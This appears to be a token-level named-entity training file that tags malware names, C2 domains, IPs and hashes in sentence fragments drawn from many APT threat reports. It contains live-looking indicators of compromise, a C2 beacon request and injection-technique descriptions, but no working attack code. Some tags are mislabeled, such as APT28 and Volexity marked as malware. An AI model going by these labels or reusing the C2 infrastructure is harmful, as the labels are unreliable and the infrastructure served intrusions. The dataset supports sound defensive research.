an	O
objective	O
.	O

Several	O
of	O
them	O
are	O
self	O
extracting	O
archives	O
containing	O
extra	O
files	O
,	O
such	O
as	O
documents	O
,	O
links	O
and	O
even	O
video	O
.	O

U.S.	O
Democratic	O
Congressional	O
Campaign	O
Committee	O
(	O
DCCC	O
)	O

Today	O
we	O
have	O
a	O
different	O
story	O
.	O

Malware	O
performs	O
multiple	O
checks	O
to	O
make	O
sure	O
that	O
it	O
is	O
connecting	O
to	O
the	O
correct	O
C2	O
server	O
before	O
doing	O
anything	O
malicious	O
.	O

knf.gov[.]pl	O
watering-hole	O
.	O

Several	O
commands	O
can	O
be	O
executed	O
in	O
the	O
context	O
of	O
ramFS	O
,	O
as	O
listed	O
in	O
the	O
following	O
Table	O
.	O

G	O
DATA	O
's	O
security	O
experts	O
identified	O
the	O
malware	O
behind	O
this	O
attack	O
and	O
reveal	O
information	O
about	O
the	O
actual	O
power	O
of	O
the	O
malware	O
's	O
tentacles	O
.	O

bbs.winupdate[.]net	B-url.cncsvr
|	O
122.10.18.166	B-ip.unknown
www.fhtd[.]info	B-url.cncsvr
|	O
122.10.18.166	B-ip.unknown

However	O
,	O
one	O
export	O
function	O
,	O
GetFolderPathNew2	O
,	O
is	O
responsible	O
for	O
loading	O
the	O
RedLeaves	O
DLL	O
implant	O
by	O
performing	O
process	O
hollowing	O
in	O
iexplore.exe	O
,	O
Microsoft	O
Corp.'s	O
default	O
browser	O
.	O

SHA1	O
hash	O
:	O
c0a4b9145e0066f5c1534beddc9c666ea8eb0882	B-hash

C03B5985F2504939DA9874246A439E25	B-hash
lokia.mine.nu	B-url.cncsvr

The	O
watchdog	O
thread	O
of	O
ZxShell	B-malware.backdoor
service	O
The	O
buffer	O
containing	O
the	O
ZxShell	B-malware.backdoor
Dll	O
in	O
the	O
new	O
location	O
is	O
freed	O
using	O
the	O
VirtualFree	O
API	O
function	O
.	O

While	O
we	O
have	O
done	O
our	O
best	O
to	O
ensure	O
that	O
the	O
material	O
found	O
in	O
this	O
document	O
is	O
accurate	O
,	O
Fidelis	O
Cybersecurity	O
,	O
Inc	O
.	O

When	O
encryption	O
is	O
done	O
,	O
this	O
filecoder	O
malware	O
creates	O
a	O
text	O
file	O
!	O
readme.txt	O
with	O
the	O
following	O
content	O
:	O

Another	O
important	O
aspect	O
during	O
an	O
APT	B-malware.unknown
investigation	O
is	O
attribution	O
.	O

The	O
main	O
tactics	O
of	O
the	O
group	O
include	O
sending	O
phishing	O
emails	O
with	O
malicious	O
documents	O
and	O
infecting	O
various	O
servers	O
.	O

The	O
encryption	O
keys	O
in	O
the	O
script	O
were	O
different	O
on	O
every	O
system	O
.	O

cybereason.com	O
/labs-operation-cobalt-kitty-a-large-scale-apt-in-asia-carried-out-by-the-oceanlotus-group/	O
The	O
investigation	O
of	O
a	O
massive	O
cyber	O
espionage	O
APT	O
(	O
Advanced	O
Persistent	O
Threat	O
)	O
became	O
a	O
game	O
of	O
one-upmanship	O
between	O
attackers	O
and	O
defenders	O
.	O

This	O
time	O
,	O
the	O
spearphishing	O
email	O
tricked	O
recipients	O
into	O
changing	O
their	O
passwords	O
through	O
a	O
fake	O
webmail	O
domain	O
hosted	O
on	O
APT28	B-malware.backdoor
operational	O
infrastructure	O
.	O

Because	O
it	O
eavesdrops	O
on	O
sensitive	O
conversations	O
by	O
remotely	O
controlling	O
PC	O
microphones	O
–	O
in	O
order	O
to	O
surreptitiously	O
'	O
bug	O
'	O
its	O
targets	O
–	O
and	O
uses	O
Dropbox	O
to	O
store	O
exfiltrated	O
data	O
,	O
CyberX	O
has	O
named	O
it	O
'	O
Operation	O
BugDrop	O
.	O
'	O

Babar	B-malware.drop
comes	O
with	O
the	O
Deflate	O
algorithm	O
,	O
as	O
used	O
by	O
Zlib	O
,	O
to	O
be	O
able	O
to	O
compress	O
data	O
before	O
encrypting	O
it	O
and	O
dumping	O
it	O
to	O
disk	O
.	O

The	O
use	O
of	O
multi-stage	O
infection	O
chains	O
makes	O
it	O
challenging	O
to	O
research	O
these	O
types	O
of	O
campaigns	O
all	O
the	O
way	O
through	O
.	O

During	O
the	O
second	O
phase	O
of	O
the	O
attack	O
,	O
the	O
attackers	O
introduced	O
two	O
sophisticated	O
backdoors	O
that	O
they	O
attempted	O
to	O
deploy	O
on	O
selected	O
targets	O
.	O

Placing	O
the	O
boot	O
sector	O
into	O
the	O
correct	O
location	O
will	O
be	O
the	O
trickiest	O
part	O
as	O
incorrect	O
placement	O
will	O
result	O
in	O
the	O
file	O
system	O
not	O
being	O
recognized	O
.	O

In	O
our	O
case	O
,	O
the	O
component	O
was	O
submitted	O
to	O
online	O
sandboxes	O
while	O
the	O
new	O
campaign	O
was	O
ongoing	O
.	O

9fb60ae410cf8e7739535aaa9771edd781f766d3	B-hash
SSL	O
communication	O
with	O
C2	O

<	O
V3	O
제품군	O
진단명	O
>	O
-	O
Trojan/Win32.Phandoor	B-malware.backdoor
(	O
2016.01.13.00	O
)	O
-	O
Trojan/Win32.Andaratm	O
(	O
2018.05.03.00	O
)	O
-	O
W97M/Downloader	O
(	O
2017.11.03.00	O
)	O
-	O
Backdoor/Win32.Aryan	O
(	O
2015.12.23.00	O
)	O
-	O
Dropper/Win32.Fakeinstaller	O
(	O
2017.01.02.09	O
)	O
-	O
Trojan/Win32.HackTool	O
(	O
2017.06.27.03	O
)	O
-	O
Trojan/Win32.Andarat	O
(	O
2017.10.27.03	O
)	O
-	O
HackTool/Win32.Malsender	O
(	O
2017.04.17.04	O
)	O
-	O
Trojan/Win32.Rifdoor	B-malware.backdoor
(	O
2015.12.23.04	O
)	O
-	O
X97M/Downloader	O
(	O
2015.12.24.05	O
)	O

The	O
steps	O
being	O
taken	O
are	O
:	O
MapViewOfFile	O
–	O
mapped	O
memory	O
shared	O
with	O
the	O
child	O
instance	O
OpenProcess	O
–	O
obtaining	O
a	O
handle	O
to	O
the	O
chosen	O
victim	O
process	O
WriteProcessMemory	O
–	O
write	O
function	O
stub	O
to	O
remote	O
memory	O
CreateRemoteThread	O
–	O
execute	O
function	O
stub	O
as	O
remote	O
process	O
VirtualAllocEx	O
–	O
allocate	O
space	O
in	O
remote	O
memory	O
The	O
function	O
stub	O
will	O
then	O
go	O
on	O
to	O
load	O
the	O
Babar	B-malware.drop
DLL	O
through	O
LoadLibraryA	O
and	O
execute	O
one	O
of	O
its	O
exports	O
,	O
as	O
indicated	O
in	O
the	O
shared	O
memory	O
.	O

A	O
ping	O
to	O
local	O
host	O
acts	O
as	O
a	O
command	O
to	O
sleep	O
for	O
four	O
seconds	O
2	O
.	O

These	O
registry	O
entries	O
ensure	O
startup	O
persistence	O
.	O

buffer	O
]	O

Invitation	O
Invitation.jar	B-malware.infosteal
859c4c667dd0f44f80b60242d93c4b0f	B-hash
Payment	O
details	O
Payment	B-malware.infosteal
details.jar	I-malware.infosteal
bd0aba05d8263fb1a9a3adcae01fc3b7	B-hash
magnumbiz.no-­‐	B-malware.infosteal
ip[.]biz	I-malware.infosteal
morechedder.no-­‐	I-malware.infosteal
ip[.]org	I-malware.infosteal

2017	O
.	O

Moreover	O
,	O
we	O
could	O
find	O
no	O
information	O
at	O
all	O
about	O
the	O
file	O
's	O
name	O
(	O
rtniczw.sys	O
)	O
or	O
its	O
MD5	O
in	O
any	O
search	O
engine	O
.	O

A	O
version	O
of	O
the	O
malicious	O
document	O
from	O
December	O
22	O
embedded	O
the	O
PowerShell	O
implant	O
directly	O
into	O
the	O
Word	O
document	O
in	O
the	O
form	O
of	O
an	O
HTA	O
 le	O
.	O

3.5.3	O
I	O
AM	O
ROOT	O
(	O
kit	O
)	O

Even	O
prior	O
to	O
its	O
discovery	O
in	O
2014	O
,	O
Inception	B-malware.backdoor
went	O
to	O
great	O
lengths	O
both	O
to	O
avoid	O
detection	O
and	O
conceal	O
its	O
location	O
.	O

However	O
,	O
research	O
into	O
other	O
websites	O
and	O
activity	O
involving	O
java-se.com	B-url.normal
did	O
lead	O
Volexity	B-malware.backdoor
to	O
live	O
exploits	O
and	O
malware	O
.	O

On	O
Triconex	B-malware.unknown
controllers	O
,	O
keys	O
should	O
not	O
be	O
left	O
in	O
the	O
PROGRAM	O
mode	O
other	O
than	O
during	O
scheduled	O
programming	O
events	O
.	O

We	O
have	O
observed	O
APT28	B-malware.infosteal
rely	O
on	O
four	O
key	O
tactics	O
when	O
attempting	O
to	O
compromise	O
intended	O
targets	O
.	O

We	O
can	O
say	O
that	O
version	O
2.14.1	O
is	O
the	O
last	O
version	O
of	O
Agent.BTZ	B-malware.backdoor
.	O

msdaipp.cnt	O
'	O
in	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DB	O
.	O

As	O
discussed	O
,	O
we	O
have	O
observed	O
the	O
Moafee	B-malware.infosteal
group	O
use	O
a	O
number	O
of	O
different	O
tools	O
including	O
Poison	O
Ivy	O
,	O
Nflog	B-malware.backdoor
,	O
Mongall	O
,	O
and	O
NewCT2	B-malware.backdoor
.	O

We	O
encourage	O
you	O
to	O
contact	O
DHS	O
NCCIC	O
(	O
NCCICCustomerService@hq.dhs.gov	O
or	O
888-282-0870	O
)	O
,	O
the	O
FBI	O
through	O
a	O
local	O
field	O
office	O
or	O
the	O
FBI	O
's	O
Cyber	O
Division	O
(	O
CyWatch@ic.fbi.gov	O
or	O
855-292-3937	O
)	O
to	O
report	O
an	O
intrusion	O
and	O
to	O
request	O
incident	O
response	O
resources	O
or	O
technical	O
assistance	O
.	O

ESA	O
can	O
block	O
spear	O
phishing	O
emails	O
sent	O
by	O
threat	O
actors	O
as	O
part	O
of	O
their	O
campaign	O
.	O

SHA512	O
30bb6c3bcb797b8ebe5ab4bef59173ba358ea6713ea26cbc0147c37b99a54eca62f09475299a44c3	B-hash
98679f84fa87dc6dff084a185543945f123fb34236fa825b	B-hash

We	O
suspect	O
that	O
the	O
e-mail	O
address	O
is	O
not	O
her	O
real	O
address	O
.	O

We	O
also	O
see	O
attacks	O
apparently	O
against	O
Palestinian	O
targets	O
without	O
being	O
able	O
to	O
tie	O
them	O
up	O
against	O
the	O
already	O
mentioned	O
attack/C	O
&	O
C	O
structure	O
.	O

Type	O
Sha256	O
Sha256	O
Sha256	O
Sha1	O
Sha1	O
Sha1	O
Filename	O
Filename	O
Filename	O
Domain	O
Domain	O
Domain	O
Domain	O
Domain	O
Indicator	O

The	O
authors	O
tried	O
to	O
hide	O
the	O
DDE	O
object	O
in	O
a	O
different	O
part	O
of	O
the	O
document	O
—	O
in	O
the	O
main	O
object	O
and	O
the	O
header	O
,	O
for	O
example	O
.	O

In	O
their	O
2013	O
paper	O
'	O
From	O
Quartermaster	O
to	O
Sunshop	O
'	O
,	O
FireEye	O
described	O
the	O
concept	O
of	O
a	O
Digital	O
Quartermaster	O
,	O
a	O
kind	O
of	O
malware	O
supply	O
chain	O
for	O
intrusions	O
,	O
where	O
a	O
skilled	O
team	O
would	O
develop	O
toolsets	O
for	O
a	O
range	O
of	O
attackers	O
who	O
deploy	O
them	O
.	O

The	O
malicious	O
Cryptui.dll	O
is	O
loaded	O
into	O
the	O
program	O
instead	O
of	O
the	O
legitimate	O
one	O
and	O
executed	O
.	O

It	O
consists	O
of	O
a	O
self-extracting	O
7zip	O
archive	O
(	O
SFX	O
)	O
which	O
,	O
when	O
extracted	O
,	O
writes	O
two	O
batch	O
scripts	O
(	O
up.bat	O
,	O
new.bat	O
)	O
to	O
disk	O
and	O
one	O
legitimate	O
application	O
called	O
curl.exe	O
.	O

Some	O
screenshots	O
taken	O
during	O
scrambling	O
and	O
encryption	O
process	O
:	O

As	O
we	O
uncover	O
more	O
targets	O
related	O
to	O
these	O
attacks	O
,	O
we	O
are	O
seeing	O
a	O
common	O
link	O
between	O
them	O
:	O
unmanned	O
vehicles	O
,	O
also	O
known	O
as	O
'	O
drones	O
'	O
.	O

McAfee	O
Application	O
Control	O
.	O

This	O
has	O
lead	O
to	O
a	O
great	O
deal	O
of	O
speculation	O
about	O
Chinese-State	O
involvement	O
.	O

The	O
heartbeat	O
package	O
data	O
includes	O
:	O
check	O
code	O
,	O
process	O
ID	O
,	O
system	O
version	O
,	O
IP	O
address	O
,	O
computer	O
name	O
,	O
account	O
,	O
whether	O
it	O
is	O
64	O
bit	O
process	O
.	O

Some	O
components	O
of	O
the	O
malware	O
's	O
behavior	O
are	O
possibly	O
remarkable	O
.	O

Malware	O
of	O
this	O
category	O
is	O
typically	O
widespread	O
,	O
but	O
in	O
the	O
case	O
of	O
Hermes	B-malware.ransom
it	O
seems	O
relatively	O
rare	O
.	O

Reviewing	O
all	O
the	O
older	O
ciphers	O
and	O
newer	O
EC	O
based	O
ciphers	O
in	O
openssl	O
and	O
elsewhere	O
results	O
in	O
no	O
match	O
.	O

Mandiant	O
recently	O
responded	O
to	O
an	O
incident	O
at	O
a	O
critical	O
infrastructure	O
organization	O
where	O
an	O
attacker	O
deployed	O
malware	O
designed	O
to	O
manipulate	O
industrial	O
safety	O
systems	O
.	O

China	B-malware.backdoor
Chopper	I-malware.backdoor
can	O
run	O
on	O
any	O
Web	O
server	O
capable	O
of	O
running	O
JSP	O
,	O
ASP	O
,	O
ASPX	O
,	O
PHP	O
,	O
or	O
CFM—the	O
majority	O
of	O
Web	O
application	O
languages	O
.	O

Once	O
the	O
file	O
system	O
has	O
been	O
decrypted	O
,	O
it	O
is	O
stored	O
in	O
memory	O
as	O
a	O
linked	O
list	O
of	O
512­byte	O
memory	O
chunks	O
,	O
each	O
one	O
of	O
them	O
being	O
individually	O
RC4­	O
encrypted	O
.	O

It	O
does	O
not	O
cost	O
anything	O
to	O
concoct	O
fake	O
registration	O
data	O
and	O
enter	O
kimsukyang	O
during	O
a	O
Hotmail	O
registration	O
.	O

Chien	O
,	O
'	O
W32.stuxnet	B-malware.backdoor
dossier	O
,	O
'	O
Symantec	O
,	O
Symantec	O
Security	O
Response	O
[	O
online	O
]	O
February	O
2011	O
.	O

206.161.216.219	B-ip.unknown
between	O
2013-09-28	O
and	O

While	O
this	O
malware	O
was	O
initially	O
discovered	O
in	O
a	O
battlefield	O
environment	O
,	O
an	O
adversary	O
could	O
also	O
leverage	O
it	O
in	O
attacks	O
against	O
non-military	O
targets	O
.	O

Although	O
all	O
of	O
the	O
document	O
exploits	O
we	O
have	O
analyzed	O
drop	O
a	O
decoy	O
document	O
,	O
most	O
of	O
them	O
are	O
either	O
empty	O
or	O
filled	O
with	O
unreadable	O
data	O
with	O
two	O
exceptions	O
.	O

To	O
reduce	O
this	O
risk	O
,	O
the	O
authors	O
have	O
used	O
a	O
global	O
mutex	O
.	O

Individual	O
believed	O
to	O
be	O
the	O
developer	O
promotes	O
Android	O
App	O
on	O
Russian	O
Social	O
Media	O
Site	O
vKontakte	B-url.normal
Kremlin	O
threatens	O
Ukraine	O
over	O
EU	O
agreement	O
Anon	O
Ops	O
vs	O
.	O

Example	O
.lnk	O
file	O
'	O
Sample	O
A	O
'	O
:	O
خي	O
ش	O
لا	O
نا	O
ندع	O
روعرع	O
لا	O
فلا	O
ت	O
ئلإا	O
ب	O
ين	O
طو	O
لا	O
يروس	O
لا	O
.lnk	O

We	O
found	O
that	O
this	O
code	O
was	O
modified	O
from	O
buffer_x86	O
and	O
buffer_x64	O
in	O
the	O
code	O
are	O
same	O
function	O
but	O
from	O
different	O
versions	O
of	O
dll	O
files	O
.	O

Let	O
me	O
start	O
with	O
a	O
question	O
:	O
how	O
many	O
Stuxnet	B-malware.backdoor
driver	O
files	O
are	O
known	O
?	O

The	O
FireEye	O
iSIGHT	O
Intelligence	O
MySIGHT	O
Portal	O
contains	O
additional	O
information	O
on	O
these	O
backdoor	O
families	O
based	O
on	O
Mandiant	O
investigations	O
of	O
APT32	B-malware.infosteal
intrusions	O
.	O

When	O
users	O
browse	O
the	O
web	O
or	O
open	O
Office	O
documents	O
,	O
they	O
are	O
likely	O
to	O
be	O
potential	O
targets	O
.	O

We	O
have	O
not	O
attributed	O
the	O
incident	O
to	O
a	O
threat	O
actor	O
,	O
though	O
we	O
believe	O
the	O
activity	O
is	O
consistent	O
with	O
a	O
nation	O
state	O
preparing	O
for	O
an	O
attack	O
.	O

This	O
versioning	O
information	O
appears	O
contrived	O
.	O

This	O
export	O
tries	O
to	O
read	O
the	O
SyLog.bin	O
file	O
located	O
inside	O
the	O
same	O
folder	O
.	O

An	O
unknown	O
attacker	O
gained	O
access	O
to	O
the	O
Bangladesh	O
Bank	O
's	O
(	O
BB	O
)	O
SWIFT	O
payment	O
system	O
and	O
reportedly	O
instructed	O
an	O
American	O
bank	O
to	O
transfer	O
money	O
from	O
BB	O
's	O
account	O
to	O
accounts	O
in	O
The	O
Philippines	O
.	O

16HXmdeh157XkNeV16o=	O
16HXmdeh157XkA==	O
16HXldeTLg==	O

The	O
module	O
might	O
connect	O
the	O
following	O
2	O
addresses	O
with	O
port	O
80	O
:	O
Sending	O
request	O
data	O
and	O
receiving	O
return	O
data	O
.	O

Dropped	O
files	O
on	O
execution	O
of	O
VPN-Pro.exe	B-malware.drop
:	O
Examination	O
of	O
the	O
'	O
svchost.exe	B-malware.drop
'	O
binary	O
shows	O
multiple	O
references	O
to	O
'	O
ShadowTech	B-malware.backdoor
Rat	I-malware.backdoor
.	O
'	O

Our	O
submission	O
to	O
VirusTotal	O

This	O
domain	O
impersonates	O
ynetnews.com	B-url.unknown
,	O
the	O
English	O
version	O
of	O
ynet.co.il	B-url.unknown
–	O
one	O
of	O
Israel	O
's	O
most	O
popular	O
news	O
sites	O
.	O

Our	O
test	O
workstation	O
use	O
Windows	O
Internet	O
Explorer	O
as	O
default	O
browser	O
This	O
trick	O
renders	O
identification	O
by	O
firewall	O
more	O
cumbersome	O
.	O

In	O
this	O
attack	O
type	O
,	O
the	O
attackers	O
'	O
goal	O
is	O
to	O
extract	O
the	O
following	O
data	O
from	O
the	O
session	O
:	O
user	O
IP	O
,	O
user	O
name	O
,	O
domain	O
name	O
,	O
NT	O
LM	O
hash	O
of	O
the	O
user	O
's	O
password	O
.	O

The	O
second	O
GET	O
request	O
to	O
the	O
stabUrl	O
uses	O
the	O
values	O
'	O
2-0-1	O
'	O
to	O
signify	O
a	O
successful	O
verification	O
of	O
a	O
supported	O
version	O
of	O
Windows	O
.	O

41889ca19c18ac59d227590eeb1da214	B-hash
Server	O
Uranio4	O

The	O
keyword	O
'	O
p=2	O
,	O
'	O
which	O
is	O
sent	O
out	O
as	O
part	O
of	O
the	O
URI	O
,	O
appears	O
to	O
indicate	O
the	O
version	O
of	O
the	O
malware	O
.	O

All	O
rasltls.dll	O
exports	O
lead	O
to	O
the	O
same	O
function	O

The	O
malicious	O
site	O
falcancoin.io	O
embedded	O
in	O
the	O
Flash	O
file	O
.	O

Finally	O
,	O
the	O
dropper	O
will	O
use	O
the	O
copy	O
of	O
rundll32.exe	O
to	O
load	O
and	O
execute	O
the	O
CozyDuke	B-malware.drop
main	O
component	O
.	O

--	O
--	O
--	O
--	O
Original	O
Message	O
--	O
--	O
--	O
-Subject	O
:	O
Transfer	O
error	O
,	O
kindly	O
reverse	O
to	O
us	O
.	O

The	O
icon	O
of	O
the	O
application	O
appears	O
in	O
the	O
Apps	O
menu	O
named	O
(	O
URL	O
Shortener	O
)	O
.	O

Malware	O
generates	O
the	O
password	O
to	O
communicate	O
with	O
the	O
C2	O
by	O
building	O
an	O
array	O
of	O
16	O
random	O
bytes	O
,	O
these	O
random	O
bytes	O
are	O
then	O
encoded	O
using	O
base64	O
encoding	O
algorithm	O
and	O
malware	O
then	O
replaces	O
the	O
characters	O
'	O
+	O
'	O
and	O
with	O
'	O
-	O
'	O
and	O
'	O
_	O
'	O
respectively	O
from	O
the	O
encoded	O
data	O
.	O

Attackers	O
also	O
used	O
the	O
name	O
of	O
the	O
top-ranking	O
official	O
associated	O
with	O
Minister	O
of	O
Home	O
affairs	O
in	O
the	O
signature	O
of	O
the	O
email	O
,	O
this	O
is	O
to	O
make	O
it	O
look	O
like	O
the	O
email	O
was	O
sent	O
by	O
a	O
high-ranking	O
Government	O
official	O
associated	O
with	O
Ministry	O
of	O
Home	O
Affairs	O
(	O
MHA	O
)	O
.	O

4/10	O

One	O
such	O
example	O
of	O
the	O
VBS	O
invoking	O
PowerShell	O
via	O
MSHTA	O
is	O
shown	O
in	O
Figure	O
3	O
.	O

Although	O
other	O
groups	O
have	O
since	O
begun	O
using	O
the	O
framework	O
,	O
the	O
first	O
groups	O
to	O
use	O
the	O
framework	O
(	O
clusters	O
1-4	O
)	O
correspond	O
quite	O
nicely	O
to	O
the	O
existing	O
Symantec	O
blog	O
.	O

If	O
scanning	O
identified	O
vulnerable	O
sites	O
,	O
attempts	O
to	O
exploit	O
the	O
vulnerabilities	O
may	O
be	O
experienced	O
.	O

In	O
theory	O
each	O
partition	O
should	O
be	O
recoverable	O
,	O
as	O
non-bootable	O
partitions	O
still	O
create	O
a	O
VBR	O
and	O
place	O
the	O
backup	O
at	O
the	O
end	O
of	O
the	O
partition	O
when	O
a	O
NTFS	O
file	O
system	O
is	O
installed	O
.	O

Another	O
interesting	O
fact	O
is	O
that	O
the	O
author	O
also	O
copied	O
the	O
registry	O
key	O
described	O
in	O
the	O
installation	O
stage	O
above	O
,	O
replacing	O
only	O
a	O
single	O
character	O
of	O
the	O
original	O
randomly	O
generated	O
unique	O
ID	O
.	O

However	O
,	O
we	O
found	O
testing	O
devices	O
enrolled	O
on	O
the	O
MDM	B-malware.infosteal
with	O
an	O
Indian	O
phone	O
number	O
and	O
registered	O
on	O
an	O
Indian	O
provider	O
.	O

For	O
example	O
,	O
the	O
attachment	O
'	O
schedule	O
(	O
2.11~16	O
)	O
.rar	O
'	O
could	O
be	O
sent	O
on	O
February	O
10th	O
,	O
with	O
Darkhotel	B-malware.infosteal
returning	O
to	O
the	O
same	O
targets	O
in	O
late	O
May	O
for	O
a	O
second	O
attempt	O
with	O
attachment	O
'	O
schedule	O
(	O
6.1~6	O
)	O
.rar	O
'	O
.	O

The	O
malware	O
appears	O
to	O
be	O
part	O
of	O
a	O
system	O
that	O
may	O
be	O
optimized	O
for	O
use	O
by	O
an	O
insider	O
agent	O
and/or	O
for	O
collecting	O
data	O
from	O
disparate	O
networks	O
or	O
air-­‐gapped	O
systems	O
.	O

Reply-To	O
Return-Path	O
User-Agent	O
Message	O
body	O
Arthur	O
Anderson	O
<	O
alexanderharolds@arthurandersen[.]com	O
>	O
Payment	O
details	O
Fri	O
,	O
16	O
May	O
2014	O
12:27:27	O
+0000	O
Payment	O
details.jar	B-malware.infosteal
<	O
alexanderharolds@arthurandersen[.]com	O
>	O
alexanderharolds@arthurandersen[.]com	O
Internet	O
Messaging	O
Program	O
(	O
IMP	O
)	O
H5	O
(	O
6.1.4	O
)	O

functions	O
.	O

The	O
main	O
example	O
of	O
this	O
generic	O
code	O
is	O
the	O
inlined	O
wcscmp	O
function	O
merged	O
by	O
the	O
compiler	O
's	O
optimization	O
,	O
meant	O
to	O
check	O
if	O
the	O
filename	O
is	O
the	O
current	O
folder	O
,	O
which	O
is	O
named	O
'	O
.	O
'	O
.	O

Featured	O
Stories	O
systemd	O
Vulnerability	O
Leads	O
to	O
Denial	O
of	O
Service	O
on	O
Linux	O
qkG	B-malware.ransom
Filecoder	I-malware.ransom
:	O
Self-Replicating	O
,	O
Document-Encrypting	O
Ransomware	O
Mitigating	O
CVE-2017-5689	B-malware.backdoor
,	O
an	O
Intel	O
Management	O
Engine	O
Vulnerability	O
A	O
Closer	O
Look	O
at	O
North	O
Korea	O
's	O
Internet	O
From	O
Cybercrime	O
to	O
Cyberpropaganda	O
Security	O
Predictions	O
for	O
2018	O
Attackers	O
are	O
banking	O
on	O
network	O
vulnerabilities	O
and	O
inherent	O
weaknesses	O
to	O
facilitate	O
massive	O
malware	O
attacks	O
,	O
IoT	O
hacks	O
,	O
and	O
operational	O
disruptions	O
.	O

Disposition-Notification-Message	O
body	O
Diosdado	O
<	O
kdiosdado@lilbello[.]com	O
>	O
FW	O
:	O
URGENT	O
CONFIRMATION	O
P/I	O
#	O
94578	O
11	O
May	O
2014	O
19:10:47	O
-0700	O
INV#94586.zip	O
sales@ttc-qroup[.]com	O
Good	O
Day	O
,	O

Resilience	O
on	O
the	O
system	O
is	O
guaranteed	O
by	O
the	O
use	O
of	O
such	O
service	O
which	O
will	O
be	O
executed	O
at	O
every	O
start	O
up	O
.	O

When	O
run	O
,	O
while	O
putty	O
is	O
installed	O
,	O
the	O
html	O
file	O
is	O
opened	O
in	O
a	O
browser	O
and	O
redirects	O
to	O
http://tinyurl[.]com/jerhz2aand	B-url.normal
then	O
to	O
http://users-management[.]com/info/index_info.php?id=9775	B-url.normal
.	O

This	O
gives	O
information	O
about	O
what	O
activities	O
are	O
ongoing	O
against	O
whom	O
using	O
what	O
tools	O
and	O
how	O
to	O
mitigate	O
This	O
process	O
involves	O
multiple	O
iterations	O
of	O
pivoting	O
by	O
a	O
great	O
deal	O
of	O
possible	O
parameters	O
–	O
similarities	O
in	O
malware	O
,	O
similarities	O
in	O
network	O
traffic	O
,	O
various	O
domain	O
registration	O
and	O
hosting	O
information	O
,	O
passive	O
DNS	O
data	O
etc	O
.	O

McAfee	O
Advanced	O
Threat	O
Research	O
analysts	O
discovered	O
another	O
document	O
that	O
was	O
hosted	O
at	O
this	O
domain	O
;	O
its	O
original	O
title	O
is	O
)	O
.docx	O
,	O
which	O
also	O
appears	O
to	O
come	O
from	O
the	O
Ministry	O
of	O
Agriculture	O
and	O
Forestry	O
.	O

Analysis	O
of	O
the	O
system	O
relied	O
on	O
the	O
availability	O
of	O
two	O
files	O
named	O
netsat.exe	O
and	O
netui3.dll	O
.	O

This	O
executable	O
represents	O
the	O
'	O
dropper	O
'	O
-	O
a	O
Windows	O
application	O
that	O
contains	O
all	O
the	O
code	O
required	O
to	O
prepare	O
a	O
compromised	O
host	O
for	O
installation	O
of	O
the	O
Gh0st	B-malware.backdoor
RAT	O
server	O
service	O
.	O

At	O
the	O
time	O
of	O
writing	O
the	O
server	O
pointed	O
to	O
by	O
horizons-tourisme.com	O
is	O
still	O
hosting	O
left	O
overs	O
from	O
the	O
C	O
&	O
C	O
infrastructure	O
used	O
by	O
Babar	B-malware.drop
.	O

Based	O
on	O
that	O
,	O
the	O
GET_PROCESSPATH	O
and	O
GET_PROCESSNAME	O
methods	O
will	O
decrypt	O
the	O
hardcoded	O
path	O
and	O
filename	O
where	O
the	O
backdoor	O
should	O
be	O
installed	O
.	O

•	O
Use	O
of	O
a	O
formal	O
coding	O
environment	O
in	O
which	O
to	O
develop	O
tools	O
,	O
allowing	O
the	O
group	O
to	O
create	O
and	O
deploy	O
custom	O
modules	O
within	O
its	O
backdoors	O
.	O

Following	O
transmission	O
,	O
it	O
is	O
immediately	O
deleted	O
from	O
the	O
victim	O
system	O
.	O

Given	O
the	O
inherent	O
nature	O
of	O
threat	O
intelligence	O
,	O
it	O
is	O
based	O
on	O
information	O
gathered	O
and	O
understood	O
at	O
a	O
specific	O
point	O
in	O
time	O
.	O

This	O
is	O
accomplished	O
by	O
extracting	O
the	O
DWORD	O
just	O
in	O
front	O
of	O
the	O
source	O
string	O
and	O
shifting	O
it	O
one	O
bit	O
to	O
the	O
right	O
,	O
in	O
order	O
to	O
calculate	O
the	O
number	O
of	O
pairs	O
of	O
source	O
characters	O
:	O

2/7/14	O

The	O
decrypted	O
data	O
is	O
a	O
field	O
of	O
executable	O
Shellcode	O
that	O
is	O
generated	O
by	O
Cobalt	O
Strike	O
(	O
An	O
automatic	O
attack	O
testing	O
platform	O
)	O
.	O

Mrxcls.sys	O
19840	O
Mrxcls.sys	O
26616	O

For	O
the	O
record	O
,	O
a	O
'	O
d13	O
'	O
folder	O
has	O
been	O
seen	O
on	O
another	O
Animal	O
Farm	O
C	O
&	O
C	O
(	O
see	O
'	O
3.7	O
Calling	O
home	O
'	O
of	O
Marschalek	O
's	O
Babar	B-malware.unknown
report	O
)	O
,	O
indicating	O
that	O
Dino	B-malware.backdoor
version	O
1.3	O
has	O
also	O
likely	O
been	O
deployed	O
at	O
some	O
point	O
.	O

We	O
did	O
not	O
encounter	O
any	O
new	O
sample	O
from	O
2011	O
,	O
but	O
the	O
malware	O
appeared	O
back	O
in	O
2012	O
,	O
with	O
a	O
new	O
major	O
version	O
.	O

New	O
MacOS	O
Backdoor	O
Linked	O
to	O
OceanLotus	O
Found	O
Cryptocurrency	O
Web	O
Miner	O
Script	O
Injected	O
into	O
AOL	O
Advertising	O
Platform	O
ChessMaster	O
Adds	O
Updated	O
Tools	O
to	O
Its	O
Arsenal	O
Monero-Mining	O
HiddenMiner	O
Android	O
Malware	O
Can	O
Potentially	O
Cause	O
Device	O
Failure	O
A	O
Closer	O
Look	O
at	O
Unpopular	O
Software	O
Downloads	O
and	O
the	O
Risks	O
They	O
Pose	O
to	O
Organizations	O

©	O
AhnLab	O
,	O
Inc	O
.	O

When	O
investigating	O
the	O
IP	O
address	O
from	O
the	O
PowerShell	O
implant	O
200.122.181.63	B-ip.unknown
we	O
found	O
a	O
server	O
in	O
Costa	O
Rica	O
that	O
resolves	O
to	O
mafra.go.kr.jeojang.ga	B-url.unknown
.	O

POST	O
/586E32A1FFFFFFFF.aspx	O
HTTP/1.1	O
Accept	O
:	O
*/*	O
Cookies	O
:	O
Sym1.0	O
:	O
0	O
,	O
Sym2.0	O
:	O
0	O
,	O
Sym3.0	O
:	O
61456	O
,	O
Sym4.0	O
:	O
1	O
Host	O
:	O
area.wthelpdesk.com:443	B-url.cncsvr
Content-Length	O
:	O
39	O
Connection	O
:	O
Keep-Alive	O
Cache-Control	O
:	O
no-cache	O

The	O
submitted	O
files	O
named	O
netui3.dll	B-malware.backdoor
and	O
winmgt.dll	B-malware.backdoor
did	O
